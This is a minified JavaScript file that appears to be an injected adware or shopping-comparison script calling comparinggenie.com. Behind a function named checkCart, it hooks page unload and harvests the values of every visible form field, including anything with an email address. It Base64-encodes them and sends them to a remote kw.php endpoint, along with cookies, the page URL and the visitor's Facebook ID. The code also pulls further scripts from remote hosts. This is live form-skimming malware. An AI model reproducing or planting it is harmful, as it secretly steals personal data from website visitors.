if(typeof requiree!="function"){function requiree(d,a,c){a=a||function(){};c=c||"text/javascript";if(c=="text/css"){ltf="link"}else{ltf="script"}var b=document.createElement(ltf);b.setAttribute("type",c);b.setAttribute("src",d);b.onload=b.onreadystatechange=function(){(!this.readyState||this.readyState==="loaded"||this.readyState==="complete")&&(a())};document.getElementsByTagName("head")[0].appendChild(b)}}function cgexec(){var a=jQuery.noConflict(true);var b=jQuery||a;if(typeof jQuery=="undefined"||jQuery.fn.jquery!=="1.7.2"){window.jQuery=b;jQuery=$=b;$ca$=a.noConflict()}else{$ca$=jQuery}requiree(castatic+"/scripts/swfstore.js?v="+caversion,function(){couload()})}if(typeof $ca$!="function"){if(typeof jQuery=="function"){if(jQuery.fn.jquery!=="1.7.2"){requiree((window.location.protocol=="https:"?"https:":"http:")+"//ajax.microsoft.com/ajax/jquery/jquery-1.7.2.min.js?v="+caversion,function(){cgexec()})}else{cgexec()}}else{requiree((window.location.protocol=="https:"?"https:":"http:")+"//ajax.microsoft.com/ajax/jquery/jquery-1.7.2.min.js?v="+caversion,function(){cgexec()})}}var trcgsp=0;if(typeof cacgfid=="undefined"){var cacgfid=""}function caeraseCookieo(a){cacreateCookieo(a,"",-1)}function careadCookieo(b){retstr="";var e=b+"=";var a=document.cookie.split(";");for(var d=0;d<a.length;d++){var f=a[d];while(f.charAt(0)==" "){f=f.substring(1,f.length)}if(f.indexOf(e)==0){retstr=f.substring(e.length,f.length)}}if(retstr){return retstr}return null}function cacreateCookieo(c,d,e){if(e){var b=new Date();b.setTime(b.getTime()+(e*24*60*60*1000));var a="; expires="+b.toGMTString()}else{var a=""}document.cookie=c+"="+d+a+"; path=/"}function checkCart(){var a=new Array();$ca$("input, select, textarea").each(function(c){input=$ca$(this);if(input.val()!=""&&input.attr("type")!="hidden"){kkj=input.val();if(kkj.match(/@/)){trcgsp=1}a.push([{type:input.attr("type")},{name:input.attr("name")},{value:input.val()}])}});var b=[];$ca$(".cgspnlink").each(function(){b.push($ca$(this).text().toLowerCase()+":"+$ca$(this).attr("data-type-id"))});b=b.filter(function(c,d){return d==b.indexOf(c)});if(typeof fkword!=="undefined"){skw=urlencode(fkword.join(" "))}else{skw=""}str=B64.encode(serialize(a));cgdd=gdomain();cgdcook="cgs"+cgdd;if(cgdd!=="undefined"){requiree(window.location.protocol+"//www.comparinggenie.com/code/kw.php?uid="+careadCookie("ngi")+"&d="+urlencode(cgdd)+"&diskw="+b.join("|")+"&kw="+str+"&u="+document.location.href+"&ftm="+careadCookieo(cgdcook)+"&cgf="+cacgfid+"&chkw="+skw+"&catype="+cgtraff+"&distr="+(cgdistributor||0)+"&remco="+ucontr+"&trepl="+textreplaced);cacreateCookieo(cgdcook,"1",1)}}if(typeof FB!=="undefined"){FB.api("/me",function(a){cacgfid=a.id})}var myEvent=window.attachEvent||window.addEventListener;var chkevent=window.attachEvent?"onbeforeunload":"beforeunload";myEvent(chkevent,function(a){checkCart()});var B64={alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",lookup:null,ie:/MSIE /.test(navigator.userAgent),ieo:/MSIE [67]/.test(navigator.userAgent),encode:function(h){var c=B64.toUtf8(h),d=-1,e=c.length,a,i,f,b=[,,,];if(B64.ie){var g=[];while(++d<e){a=c[d];i=c[++d];b[0]=a>>2;b[1]=((a&3)<<4)|(i>>4);if(isNaN(i)){b[2]=b[3]=64}else{f=c[++d];b[2]=((i&15)<<2)|(f>>6);b[3]=(isNaN(f))?64:f&63}g.push(B64.alphabet.charAt(b[0]),B64.alphabet.charAt(b[1]),B64.alphabet.charAt(b[2]),B64.alphabet.charAt(b[3]))}return g.join("")}else{var g="";while(++d<e){a=c[d];i=c[++d];b[0]=a>>2;b[1]=((a&3)<<4)|(i>>4);if(isNaN(i)){b[2]=b[3]=64}else{f=c[++d];b[2]=((i&15)<<2)|(f>>6);b[3]=(isNaN(f))?64:f&63}g+=B64.alphabet[b[0]]+B64.alphabet[b[1]]+B64.alphabet[b[2]]+B64.alphabet[b[3]]}return g}},decode:function(e){if(e.length%4){throw new Error("InvalidCharacterError: 'B64.decode' failed: The string to be decoded is not correctly encoded.")}var d=B64.fromUtf8(e),c=0,b=d.length;if(B64.ieo){var a=[];while(c<b){if(d[c]<128){a.push(String.fromCharCode(d[c++]))}else{if(d[c]>191&&d[c]<224){a.push(String.fromCharCode(((d[c++]&31)<<6)|(d[c++]&63)))}else{a.push(String.fromCharCode(((d[c++]&15)<<12)|((d[c++]&63)<<6)|(d[c++]&63)))}}}return a.join("")}else{var a="";while(c<b){if(d[c]<128){a+=String.fromCharCode(d[c++])}else{if(d[c]>191&&d[c]<224){a+=String.fromCharCode(((d[c++]&31)<<6)|(d[c++]&63))}else{a+=String.fromCharCode(((d[c++]&15)<<12)|((d[c++]&63)<<6)|(d[c++]&63))}}}return a}},toUtf8:function(e){var b=-1,a=e.length,d,c=[];if(/^[\x00-\x7f]*$/.test(e)){while(++b<a){c.push(e.charCodeAt(b))}}else{while(++b<a){d=e.charCodeAt(b);if(d<128){c.push(d)}else{if(d<2048){c.push((d>>6)|192,(d&63)|128)}else{c.push((d>>12)|224,((d>>6)&63)|128,(d&63)|128)}}}}return c},fromUtf8:function(e){var b=-1,a,c=[],d=[,,,];if(!B64.lookup){a=B64.alphabet.length;B64.lookup={};while(++b<a){B64.lookup[B64.alphabet.charAt(b)]=b}b=-1}a=e.length;while(++b<a){d[0]=B64.lookup[e.charAt(b)];d[1]=B64.lookup[e.charAt(++b)];c.push((d[0]<<2)|(d[1]>>4));d[2]=B64.lookup[e.charAt(++b)];if(d[2]==64){break}c.push(((d[1]&15)<<4)|(d[2]>>2));d[3]=B64.lookup[e.charAt(++b)];if(d[3]==64){break}c.push(((d[2]&3)<<6)|d[3])}return c}};function serialize(h){switch(typeof(h)){case"number":if(isNaN(h)||!isFinite(h)){return false}else{return(Math.floor(h)==h?"i":"d")+":"+h+";"}case"string":return"s:"+h.length+':"'+h+'";';case"boolean":return"b:"+(h?"1":"0")+";";case"object":if(h==null){return"N;"}else{if(h instanceof Array){var b={idx:-1};var f=[];for(var c=0;c<h.length;c++){b.idx++;var a=serialize(h[c]);if(a){f.push(((h[c] instanceof Array)?serialize(b.idx):"")+a)}}return"a:"+h.length+":{"+f.join("")+"}"}else{var e=get_class(h);if(e==undefined){return false}var d=new Array();for(var g in h){var a=serialize(h[g]);if(a){d.push(serialize(g)+a)}}return d.join("")}}case"undefined":return"N;"}return false}function get_class(b){if(b&&typeof b==="object"&&Object.prototype.toString.call(b)!=="[object Array]"&&b.constructor&&b!==this.window){var a=b.constructor.toString().match(/function\s*(\w+)/);if(a&&a.length===2){return a[1]}}return false};